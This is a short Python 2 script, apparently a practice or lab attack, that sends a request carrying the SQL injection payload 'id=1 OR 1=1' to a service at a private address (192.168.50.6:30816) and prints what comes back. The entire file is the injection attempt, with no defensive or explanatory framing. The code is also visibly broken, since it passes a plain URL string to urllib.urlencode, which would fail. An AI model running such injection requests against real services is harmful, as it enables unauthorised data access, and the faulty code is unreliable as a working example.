import urllib
import urllib2


url = urllib.urlencode("http://192.168.50.6:30816?id=1 OR 1=1")
print urllib2.urlopen(url).read()


